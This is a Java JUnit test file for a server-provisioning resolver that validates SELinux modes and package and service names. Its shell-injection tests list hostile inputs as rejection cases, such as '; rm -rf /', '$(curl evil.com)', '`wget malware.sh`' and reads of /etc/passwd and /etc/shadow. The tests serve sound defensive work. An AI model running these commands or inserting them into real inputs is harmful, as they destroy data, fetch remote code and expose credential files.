package com.example.serverprovision.application.setting.service.resolver;

import com.example.serverprovision.application.setting.model.OSSetting;
import com.example.serverprovision.application.setting.model.enums.SettingProcessStep;
import com.example.serverprovision.application.setting.model.request.AbstractProcessRequest;
import com.example.serverprovision.application.setting.model.request.OSSettingRequest;
import com.example.serverprovision.global.exception.FieldValidationException;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.NullSource;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class OSSettingResolverTest {

    private final OSSettingResolver resolver = new OSSettingResolver();

    // ========== supports() ==========

    @Nested
    @DisplayName("supports()")
    class SupportsTest {

        @Test
        @DisplayName("OSSettingRequest 타입이면 true를 반환한다")
        void returnsTrue_forOSSettingRequest() {
            OSSettingRequest request = new OSSettingRequest("enforcing", List.of(), List.of());
            assertThat(resolver.supports(request)).isTrue();
        }

        @Test
        @DisplayName("다른 AbstractProcessRequest 구현체이면 false를 반환한다")
        void returnsFalse_forOtherRequestType() {
            AbstractProcessRequest other = new AbstractProcessRequest() {};
            assertThat(resolver.supports(other)).isFalse();
        }
    }

    // ========== resolve() - 정상 케이스 ==========

    @Nested
    @DisplayName("resolve() - 정상 케이스")
    class ResolveHappyPathTest {

        @Test
        @DisplayName("유효한 입력으로 OSSetting을 올바르게 생성한다")
        void createsOSSetting_withValidInput() {
            OSSettingRequest request = new OSSettingRequest(
                    "enforcing",
                    List.of("httpd", "sshd"),
                    List.of("vim", "net-tools")
            );

            OSSetting result = (OSSetting) resolver.resolve(request);

            assertThat(result.getProcessStep()).isEqualTo(SettingProcessStep.OS_SETTING);
            assertThat(result.getSelinuxMode()).isEqualTo("enforcing");
            assertThat(result.getEnabledServices()).containsExactly("httpd", "sshd");
            assertThat(result.getAdditionalPackages()).containsExactly("vim", "net-tools");
        }

        @ParameterizedTest
        @ValueSource(strings = {"enforcing", "permissive", "disabled"})
        @DisplayName("허용된 SELinux 모드는 모두 정상 처리된다")
        void acceptsAllValidSelinuxModes(String mode) {
            OSSettingRequest request = new OSSettingRequest(mode, List.of(), List.of());
            OSSetting result = (OSSetting) resolver.resolve(request);
            assertThat(result.getSelinuxMode()).isEqualTo(mode);
        }

        @Test
        @DisplayName("빈 서비스/패키지 목록으로도 정상 생성된다")
        void createsOSSetting_withEmptyLists() {
            OSSettingRequest request = new OSSettingRequest("disabled", List.of(), List.of());
            OSSetting result = (OSSetting) resolver.resolve(request);

            assertThat(result.getEnabledServices()).isEmpty();
            assertThat(result.getAdditionalPackages()).isEmpty();
        }
    }

    // ========== resolve() - SELinux 모드 검증 ==========

    @Nested
    @DisplayName("resolve() - SELinux 모드 검증 실패")
    class ResolveSelinuxValidationTest {

        @Test
        @DisplayName("null selinuxMode이면 FieldValidationException을 던진다")
        void throwsException_whenSelinuxModeIsNull() {
            OSSettingRequest request = new OSSettingRequest(null, List.of(), List.of());

            assertThatThrownBy(() -> resolver.resolve(request))
                    .isInstanceOf(FieldValidationException.class)
                    .hasMessageContaining("SELinux 모드는");
        }

        @ParameterizedTest
        @ValueSource(strings = {"", "  ", "invalid", "ENFORCING", "Permissive", "DISABLED", "selinux"})
        @DisplayName("잘못된 selinuxMode 값이면 FieldValidationException을 던진다")
        void throwsException_whenSelinuxModeIsInvalid(String invalidMode) {
            OSSettingRequest request = new OSSettingRequest(invalidMode, List.of(), List.of());

            assertThatThrownBy(() -> resolver.resolve(request))
                    .isInstanceOf(FieldValidationException.class)
                    .hasMessageContaining("SELinux 모드는");
        }
    }

    // ========== resolve() - Shell Injection 방어 ==========

    @Nested
    @DisplayName("resolve() - Shell Injection 방어 (SAFE_NAME_PATTERN)")
    class ShellInjectionDefenseTest {

        @ParameterizedTest
        @ValueSource(strings = {
                "; rm -rf /",
                "$(curl evil.com)",
                "`wget malware.sh`",
                "pkg && echo hacked",
                "pkg | cat /etc/passwd",
                "pkg > /dev/null",
                "pkg < /etc/shadow",
                "name with spaces",
                "../../../etc/passwd",
                "pkg\nnewline",
                "pkg\ttab",
                "${IFS}cat${IFS}/etc/passwd",
                "pkg;id",
                "$(id)"
        })
        @DisplayName("악성 패키지명은 FieldValidationException을 던진다")
        void rejectsShellInjection_inPackageNames(String maliciousName) {
            OSSettingRequest request = new OSSettingRequest(
                    "enforcing", List.of(), List.of(maliciousName));

            assertThatThrownBy(() -> resolver.resolve(request))
                    .isInstanceOf(FieldValidationException.class)
                    .hasMessageContaining("허용되지 않는 문자");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "; systemctl stop firewalld",
                "$(reboot)",
                "sshd && rm -rf /",
                "svc | tee /etc/crontab",
                "svc name"
        })
        @DisplayName("악성 서비스명은 FieldValidationException을 던진다")
        void rejectsShellInjection_inServiceNames(String maliciousName) {
            OSSettingRequest request = new OSSettingRequest(
                    "enforcing", List.of(maliciousName), List.of());

            assertThatThrownBy(() -> resolver.resolve(request))
                    .isInstanceOf(FieldValidationException.class)
                    .hasMessageContaining("허용되지 않는 문자");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "vim", "httpd", "sshd", "net-tools", "gcc-c++",
                "python3.11", "java-17-openjdk", "kernel-devel",
                "libstdc++", "perl-Net-SSLeay", "xorg-x11-server-Xorg"
        })
        @DisplayName("정상 패키지/서비스명은 허용된다")
        void acceptsSafeNames(String safeName) {
            OSSettingRequest request = new OSSettingRequest(
                    "enforcing", List.of(safeName), List.of(safeName));

            OSSetting result = (OSSetting) resolver.resolve(request);

            assertThat(result.getEnabledServices()).contains(safeName);
            assertThat(result.getAdditionalPackages()).contains(safeName);
        }

        @Test
        @DisplayName("빈 문자열 원소는 건너뛰고 정상 처리된다")
        void skipsBlankElements() {
            OSSettingRequest request = new OSSettingRequest(
                    "enforcing", List.of("httpd", "", "  "), List.of("vim", ""));

            OSSetting result = (OSSetting) resolver.resolve(request);

            assertThat(result.getEnabledServices()).containsExactly("httpd", "", "  ");
            assertThat(result.getAdditionalPackages()).containsExactly("vim", "");
        }

        @Test
        @DisplayName("예외 메시지에 필드 인덱스가 포함된다")
        void exceptionContainsFieldIndex() {
            OSSettingRequest request = new OSSettingRequest(
                    "enforcing", List.of("httpd", "; rm -rf /"), List.of());

            assertThatThrownBy(() -> resolver.resolve(request))
                    .isInstanceOf(FieldValidationException.class)
                    .satisfies(ex -> {
                        FieldValidationException fve = (FieldValidationException) ex;
                        assertThat(fve.getField()).isEqualTo("enabledServices[1]");
                    });
        }
    }
}
